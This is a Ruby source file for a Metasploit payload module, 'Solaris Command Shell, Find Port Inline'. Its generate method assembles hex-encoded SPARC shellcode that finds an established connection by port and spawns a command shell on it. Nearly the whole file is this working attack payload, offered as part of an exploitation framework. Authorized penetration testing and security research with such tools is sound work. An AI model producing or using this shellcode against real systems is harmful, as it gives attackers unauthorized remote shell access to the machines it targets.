##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/find_port'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

  include Msf::Payload::Single
  include Msf::Payload::Solaris
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Solaris Command Shell, Find Port Inline',
      'Description'   => 'Spawn a shell on an established connection',
      'Author'        => 'vlad902',
      'License'       => MSF_LICENSE,
      'Platform'      => 'solaris',
      'Arch'          => ARCH_SPARC,
      'Handler'       => Msf::Handler::FindPort,
      'Session'       => Msf::Sessions::CommandShell))
  end

  def generate
    port    = (datastore['CPORT'] || '0').to_i
    payload =
      Rex::Arch::Sparc.set(port, "l6") +
      "\x9c\x2b\xa0\x07\x90\x1a\x80\x0a\xd0\x23\xbf\xe8\x90\x02\x20\x01" +
      "\x90\x0a\x2f\xff\x92\x10\x20\x10\xd0\x3b\xbf\xf8\x94\x23\xa0\x04" +
      "\x92\x23\xa0\x18\x82\x10\x20\xf3\x91\xd0\x20\x08\x94\x10\x20\x03" +
      "\xea\x13\xbf\xea\xba\x9d\x40\x16\x12\xbf\xff\xf5\xd0\x03\xbf\xf8" +
      "\x92\x10\x20\x09\x94\xa2\xa0\x01\x82\x10\x20\x3e\x91\xd0\x20\x08" +
      "\x12\xbf\xff\xfb\x96\x1a\xc0\x0b\x21\x0b\xd8\x9a\xa0\x14\x21\x6e" +
      "\x23\x0b\xdc\xda\x90\x23\xa0\x10\x92\x23\xa0\x08\xe0\x3b\xbf\xf0" +
      "\xd0\x23\xbf\xf8\xc0\x23\xbf\xfc\x82\x10\x20\x3b\x91\xd0\x20\x08"
  end

end
